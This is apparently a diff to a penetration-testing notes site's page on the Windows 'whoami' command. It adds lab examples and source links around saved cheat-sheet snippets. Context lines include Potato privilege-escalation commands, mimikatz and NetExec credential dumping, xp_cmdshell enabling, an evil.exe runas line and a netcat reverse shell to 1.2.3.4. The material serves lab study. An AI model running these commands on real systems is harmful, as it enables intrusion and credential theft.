@@ -9,6 +9,95 @@ hideFooterPagination: true
 
 {/* Generated from Commands/whoami.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## whoami: choose the operation and read the result
+
+Check the current account and Windows privileges.
+
+### What the result establishes
+
+Use the identity, group and privilege views to establish the current process token.
+
+### Prerequisites and common failures
+
+A username alone does not establish elevation, enabled privileges or credentials usable for a second network hop.
+
+### Example 1: Commands
+
+Run in: **Windows cmd.exe or PowerShell**.
+
+```powershell
+whoami
+whoami /priv
+whoami /groups
+```
+
+### Example 2: Phase 6 — Post-Exploitation: Confirming Privilege Level
+
+Run in: **Saved lab example**.
+
+```text
+whoami
+```
+
+Saved context: [Common Services: Personal Assessment Notes — Phase 6 — Post-Exploitation: Confirming Privilege Level](/modules/common-services/assessment#phase-6-—-post-exploitation-confirming-privilege-level). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Identify token groups and privileges
+
+Run in: **Saved lab example**.
+
+```powershell
+whoami /all
+```
+
+Saved context: [AD Lab Guide — Full Reference — Identify token groups and privileges](/lab-guide/reference#identify-token-groups-and-privileges). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Phase 6 — Post-Exploitation: Confirming Privilege Level
+
+Run in: **Saved lab example**.
+
+```text
+whoami /priv
+```
+
+Saved context: [Common Services: Personal Assessment Notes — Phase 6 — Post-Exploitation: Confirming Privilege Level](/modules/common-services/assessment#phase-6-—-post-exploitation-confirming-privilege-level). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Tools for this service
+
+Run in: **Saved lab example**.
+
+```powershell
+whoami
+hostname
+```
+
+Saved context: [Evil-WinRM — Connect to Windows — Tools for this service](/tools/evil-winrm#tools-for-this-service). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: User Enumeration
+
+Run in: **Saved lab example**.
+
+```powershell
+whoami /priv
+whoami /groups
+```
+
+Saved context: [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: User Enumeration
+
+Run in: **Saved lab example**.
+
+```powershell
+echo %USERNAME% || whoami
+$env:username
+```
+
+Saved context: [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Check the current account and Windows privileges.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=whoami) · [All tools](/index)
@@ -43,6 +132,13 @@ whoami /priv
 net user USER /domain
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD groups and effective access — Windows — inspect the current session](/field/ad-groups#windows-—-inspect-the-current-session)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="8. Windows privesc">
@@ -57,6 +153,13 @@ whoami /groups    :: BUILTIN\Administrators? privileged AD groups?
 whoami /all       :: full token (SID, integrity level)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 8. Windows privesc](/cheatsheets/ad-attack-path-worked-example#8-windows-privesc)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move">
@@ -70,6 +173,13 @@ whoami /all       :: full token (SID, integrity level)
 :: or, very reliable on Server 2019:
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move](/cheatsheets/ad-attack-path-worked-example#b-abuse-seimpersonateprivilege-→-system-no-uac-needed-—-the-clean-htb-move)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -102,6 +212,13 @@ whoami /priv
     # Show privileges assigned to the current Windows account
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration Commands — Windows Local Groups](/active-directory/command-reference#windows-local-groups)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Getting a SYSTEM shell using Impacket&#x27;s psexec.py">
@@ -131,6 +248,13 @@ nt authority\system
 C:\Windows\system32> hostname
 ACADEMY-EA-DC01
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Linux — Getting a SYSTEM shell using Impacket's psexec.py](/active-directory/trusts-child-parent-linux#getting-a-system-shell-using-impackets-psexec-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -181,6 +305,13 @@ C:\Windows\system32>exit
 [*] Removing file BnEGssCE.exe.....
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Linux — Performing the Attack with raiseChild.py](/active-directory/trusts-child-parent-linux#performing-the-attack-with-raisechild-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="CrackMapExec">
@@ -197,6 +328,13 @@ SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d
 SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
 SMB         10.10.110.17 445    WIN7BOX  nt authority\system
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — CrackMapExec](/modules/common-services/full-reference#crackmapexec)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -217,6 +355,13 @@ NULL
 (2 rows affected)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Execute Commands](/modules/common-services/full-reference#execute-commands) · [Attacking SQL Databases: Module Notes — Execute Commands](/modules/common-services/sql#execute-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Forced Authentication Attacks">
@@ -236,6 +381,13 @@ PS C:\Windows\system32> whoami;hostname
 nt authority\system
 WIN11BOX
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Forced Authentication Attacks](/modules/common-services/full-reference#forced-authentication-attacks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -266,6 +418,13 @@ nt authority\system
 WIN7BOX
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Impacket PsExec](/modules/common-services/full-reference#impacket-psexec)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Phase 6 — Post-Exploitation: Confirming Privilege Level">
@@ -277,6 +436,13 @@ WIN7BOX
 ```text
 whoami
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Phase 6 — Post-Exploitation: Confirming Privilege Level](/modules/common-services/assessment#phase-6-—-post-exploitation-confirming-privilege-level)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -304,6 +470,13 @@ Windows IP Configuration
    DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Forest Trusts - Windows — Accessing DC03 Using Enter-PSSession](/active-directory/trusts-cross-forest-windows#accessing-dc03-using-enter-pssession)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Tools for this service">
@@ -316,6 +489,13 @@ Windows IP Configuration
 whoami
 hostname
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Evil-WinRM — Connect to Windows — Tools for this service](/tools/evil-winrm#tools-for-this-service)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -350,6 +530,13 @@ xp_cmdshell whoami
 xp_cmdshell dir C:\Users
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — MSSQL](/enumeration/footprinting-lab-methodology-cheat-sheet#mssql) · [Microsoft SQL Server Enumeration — Example 4: MSSQL](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-4-mssql)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="First look at privilege escalation">
@@ -370,6 +557,13 @@ whoami /priv                  # dangerous privileges?
 systeminfo                    # patch level / OS
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Getting Started with Penetration Testing — First look at privilege escalation](/getting-started/getting-started-cheat-sheet#first-look-at-privilege-escalation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Enumeration (post-foothold)">
@@ -381,6 +575,13 @@ systeminfo                    # patch level / OS
 ```bash
 # linpeas / winpeas / pspy / whoami /all etc.
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTB Box Note Template — Enumeration (post-foothold)](/templates/box-note#enumeration-post-foothold)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -396,6 +597,13 @@ find / -perm -2 -type f 2>/dev/null
 find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Writable files](/privesc/linux-privesc-checklist#writable-files) · [Bash quoting and pipelines — Example 7: Writable files](/field/bash#example-7-writable-files)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="From DB access to OS command execution">
@@ -410,6 +618,13 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — From DB access to OS command execution](/enumeration/mssql-microsoft-sql-server-cheat-sheet#from-db-access-to-os-command-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Microsoft SQL Server Enumeration**
 
 Context from the notebook: (Impacket exposes shortcuts:  enable_xp_cmdshell  then  xp_cmdshell whoami .)
@@ -417,6 +632,13 @@ Context from the notebook: (Impacket exposes shortcuts:  enable_xp_cmdshell  the
 ```text
 xp_cmdshell whoami
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — From DB access to OS command execution](/enumeration/mssql-microsoft-sql-server-cheat-sheet#from-db-access-to-os-command-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -439,6 +661,13 @@ nxc smb $IP -u admin -p PASS --sam --lsa --ntds
 nxc smb $IP -u admin -p PASS -x 'whoami'        # or -X for powershell
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NetExec: Authentication and Enumeration — Existing notes and worked examples](/tools/netexec#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 3 — Use the ticket (lateral movement)">
@@ -457,6 +686,13 @@ PS C:\tools> Enter-PSSession -ComputerName DC01
 [DC01]: PS C:\Users\john\Documents> whoami
 inlanefreight\john
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 3 — Use the ticket (lateral movement)](/password-attacks/pass-the-ticket-from-windows#step-3-—-use-the-ticket-lateral-movement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -478,6 +714,13 @@ systeminfo
 net user; net localgroup administrators
 Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privilege Escalation: Choose a Checklist — Quick-start command cheat (run first, always)](/privesc/index#quick-start-command-cheat-run-first-always-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -522,6 +765,13 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 NULL
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privileged Remote Access — Enumerating our Rights on the System using xp_cmdshell](/active-directory/privileged-access#enumerating-our-rights-on-the-system-using-xp_cmdshell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Sliver: Session and Pivoting Quick Reference">
@@ -543,6 +793,13 @@ sliver (SESSION) > whoami ; ls ; getprivs
 sliver (SESSION) > socks5 start       # pivot; or: pivots / portfwd
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Sliver: Session and Pivoting Quick Reference — Existing notes and worked examples](/tools/sliver#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)">
@@ -562,6 +819,13 @@ sliver (SESSION) > socks5 start       # pivot; or: pivots / portfwd
 .\EfsPotato.exe "cmd /c whoami"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)](/cheatsheets/windows-post-exploitation#a-seimpersonate-/-seassignprimarytoken-→-system-potato)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Who am I / what can I do">
@@ -577,6 +841,13 @@ whoami /groups               :: group memberships + integrity level
 whoami /all                  :: everything: SID, groups, privileges, integrity
 echo %USERDOMAIN% %COMPUTERNAME%
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — Who am I / what can I do](/cheatsheets/windows-post-exploitation#who-am-i-/-what-can-i-do)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -606,6 +877,13 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 }
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Incorrect permissions in services](/privesc/windows-privesc-checklist#eop-incorrect-permissions-in-services)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="EoP - Runas">
@@ -618,6 +896,13 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 runas /savecred /user:Administrator "cmd.exe /k whoami"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Runas](/privesc/windows-privesc-checklist#eop-runas)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -633,6 +918,13 @@ wsl whoami
 wsl whoami
 wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Windows Subsystem for Linux (WSL)](/privesc/windows-privesc-checklist#eop-windows-subsystem-for-linux-wsl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -655,6 +947,13 @@ mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\W
 mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — HiveNightmare](/privesc/windows-privesc-checklist#hivenightmare)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="JuicyPotatoNG">
@@ -666,6 +965,13 @@ mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCop
 ```powershell
 JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — JuicyPotatoNG](/privesc/windows-privesc-checklist#juicypotatong)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -688,6 +994,13 @@ https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 use exploit/windows/local/ms15_051_client_copy_image
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012](/privesc/windows-privesc-checklist#ms15-051-client-copy-image-microsoft-windows-2003/2008/7/8/2012)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -724,6 +1037,13 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Restore A Service Account's Privileges](/privesc/windows-privesc-checklist#restore-a-service-accounts-privileges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="User Enumeration">
@@ -737,12 +1057,26 @@ echo %USERNAME% || whoami
 $env:username
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
 whoami /priv
 whoami /groups
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Windows Privilege Escalation: Full Checklist**
 
@@ -752,6 +1086,13 @@ whoami /all
 Get-LocalUser | ft Name,Enabled,LastLogon
 Get-ChildItem C:\Users -Force | select Name
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -768,11 +1109,25 @@ Enter-PSSession -ComputerName <IP> -Credential <domain\user>
 Invoke-Command -ComputerName <IP> -Credential <user> -ScriptBlock { whoami }
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Footprinting & connecting](/enumeration/windows-remote-management-protocols-cheat-sheet#footprinting-&-connecting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Remote Access: RDP, WinRM, and WMI**
 
 ```cmd
 winrs -r:<IP> -u:<user> -p:<pass> "cmd /c whoami"   # one-shot command
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Footprinting & connecting](/enumeration/windows-remote-management-protocols-cheat-sheet#footprinting-&-connecting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -791,6 +1146,13 @@ wmiexec.py <user>:"<pass>"@<IP>                 # interactive
 wmiexec.py -hashes :<NTLM_hash> <user>@<IP>     # pass-the-hash
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Footprinting & execution](/enumeration/windows-remote-management-protocols-cheat-sheet#footprinting-&-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Remote Access: RDP, WinRM, and WMI**
 
 ```powershell
@@ -798,6 +1160,13 @@ wmiexec.py -hashes :<NTLM_hash> <user>@<IP>     # pass-the-hash
 Get-WmiObject -Class Win32_OperatingSystem -ComputerName <IP> -Credential <user>
 Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\out.txt" -ComputerName <IP>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Footprinting & execution](/enumeration/windows-remote-management-protocols-cheat-sheet#footprinting-&-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -812,6 +1181,13 @@ Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami 
 nxc smb 192.0.2.10 -d example.local -u administrator -p 'PASSWORD' -x 'whoami'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows remote execution by service — NetExec command execution](/tools/windows-remote-execution#netexec-command-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="atexec.py">
@@ -824,6 +1200,13 @@ nxc smb 192.0.2.10 -d example.local -u administrator -p 'PASSWORD' -x 'whoami'
 impacket-atexec 'example.local/administrator@192.0.2.10' 'whoami'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows remote execution by service — atexec.py](/tools/windows-remote-execution#atexec-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="dcomexec.py">
@@ -835,6 +1218,13 @@ impacket-atexec 'example.local/administrator@192.0.2.10' 'whoami'
 ```bash
 impacket-dcomexec 'example.local/administrator@192.0.2.10' 'whoami'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows remote execution by service — dcomexec.py](/tools/windows-remote-execution#dcomexec-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -852,6 +1242,13 @@ impacket-wmiexec 'example.local/administrator@192.0.2.10'
 impacket-wmiexec -hashes ':NT_HASH' 'example.local/administrator@192.0.2.10' 'whoami'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows remote execution by service — wmiexec.py](/tools/windows-remote-execution#wmiexec-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="⏱️ HOW TO USE THIS — decision header (&quot;if you have X, do Y&quot;)">
@@ -866,6 +1263,13 @@ Context from the notebook: Golden rule of order on any new host:   enumerate bef
 whoami /priv
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")](/cheatsheets/ad-attack-path-worked-example#-how-to-use-this-—-decision-header-if-you-have-x-do-y) · [Windows Post-Exploitation: Field Reference — ⏱️ DECISION HEADER — "I have a shell, now what?"](/cheatsheets/windows-post-exploitation#-decision-header-—-i-have-a-shell-now-what) · [Windows Post-Exploitation: Field Reference — 🧠 The Windows post-ex mindset](/cheatsheets/windows-post-exploitation#-the-windows-post-ex-mindset) · [Common Services: Personal Assessment Notes — Phase 6 — Post-Exploitation: Confirming Privilege Level](/modules/common-services/assessment#phase-6-—-post-exploitation-confirming-privilege-level) · [Privilege Escalation: Choose a Checklist — Windows](/privesc/index#windows) · [Windows Privilege Escalation: Full Checklist — Existing notes and worked examples](/privesc/windows-privesc-checklist#existing-notes-and-worked-examples) · [Windows Privilege Escalation: Full Checklist — Juicy Potato (Abusing the golden privileges)](/privesc/windows-privesc-checklist#juicy-potato-abusing-the-golden-privileges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Attack Path: Worked Lab**
 
 Context from the notebook: Golden rule of order on any new host:   enumerate before you exploit.  On Windows the first three commands are always  whoami /priv ,  whoami /groups ,  whoami /all  — they decide your entire privesc path (see  8 ).
@@ -874,6 +1278,13 @@ Context from the notebook: Golden rule of order on any new host:   enumerate bef
 whoami /groups
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")](/cheatsheets/ad-attack-path-worked-example#-how-to-use-this-—-decision-header-if-you-have-x-do-y) · [Windows Post-Exploitation: Field Reference — ⏱️ DECISION HEADER — "I have a shell, now what?"](/cheatsheets/windows-post-exploitation#-decision-header-—-i-have-a-shell-now-what) · [Privilege Escalation: Choose a Checklist — Windows](/privesc/index#windows) · [Windows Privilege Escalation: Full Checklist — Existing notes and worked examples](/privesc/windows-privesc-checklist#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Attack Path: Worked Lab**
 
 Context from the notebook: Golden rule of order on any new host:   enumerate before you exploit.  On Windows the first three commands are always  whoami /priv ,  whoami /groups ,  whoami /all  — they decide your entire privesc path (see  8 ).
@@ -881,6 +1292,13 @@ Context from the notebook: Golden rule of order on any new host:   enumerate bef
 ```text
 whoami /all
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")](/cheatsheets/ad-attack-path-worked-example#-how-to-use-this-—-decision-header-if-you-have-x-do-y) · [AD Lab Guide — Full Reference — Identify token groups and privileges](/lab-guide/reference#identify-token-groups-and-privileges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -895,6 +1313,13 @@ Context from the notebook: Foothold  → 2.  Enumerate the host  (Linux: history
 ```text
 whoami /priv|/groups
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🧠 Methodology distilled (memorize this loop)](/cheatsheets/ad-attack-path-worked-example#-methodology-distilled-memorize-this-loop)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -919,6 +1344,21 @@ whoami
 nt authority\system
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Getting the SYSTEM Shell](/active-directory/historical-vulnerability-labs#getting-the-system-shell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Enumerate Active Directory with Built-in Tools](/active-directory/living-off-the-land)
+
+{/* VAULT_RELATED_END */}
